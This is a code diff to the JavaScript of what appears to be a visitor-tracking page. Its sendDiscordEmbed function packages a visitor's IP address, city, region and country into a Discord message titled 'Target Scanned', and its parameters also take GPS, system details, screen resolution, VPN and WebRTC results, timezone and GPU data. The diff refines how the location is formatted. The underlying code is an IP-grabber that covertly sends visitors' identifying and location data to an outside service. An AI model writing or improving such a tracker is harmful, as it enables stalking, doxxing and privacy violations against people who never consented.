@@ -270,21 +270,21 @@ fetch('config.json')
     
     
             // Function to send message to Discord
-            function sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone, gpuValue) {
+            function sendDiscordEmbed(_location_, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone, gpuValue) {
                 var additionalDetails = getAdditionalDetails();
-    
+
                 var embeds = [{
                     "title": "Target Scanned",
                     "color": 65280,
                     "fields": [
                         {
                             "name": "IP Address",
-                            "value": location.ip ? location.ip : "dunno",
+                            "value": _location_.ip ? _location_.ip : "dunno",
                             "inline": true
                         },
                         {
                             "name": "Location",
-                            "value": `${location.city}, ${location.region}, ${location.country_name}`,
+                            "value": `${_location_.city}, ${_location_.region}, ${_location_.country_name}`,
                             "inline": true
                         },
                         {
@@ -359,6 +359,29 @@ fetch('config.json')
                         }
                     ]
                 }];
+
+                if (_location_.region === null){
+                    if (embeds[0] && embeds[0].fields) { //overloaded once
+                        for (let i = 0; i < embeds[0].fields.length; i++) {
+                            if (embeds[0].fields[i].name === "Location") {
+                                embeds[0].fields[i].value = `${_location_.city}, ${_location_.country_name}`;
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                if(_location_.city == _location_.country_name){
+                    if (embeds[0] && embeds[0].fields) { //overloaded once
+                        for (let i = 0; i < embeds[0].fields.length; i++) {
+                            if (embeds[0].fields[i].name === "Location") {
+                                embeds[0].fields[i].value = `${_location_.city}`;
+                                break;
+                            }
+                        }
+                    }
+                }
+                
     
                 sendDiscordMessage(embeds);
             }
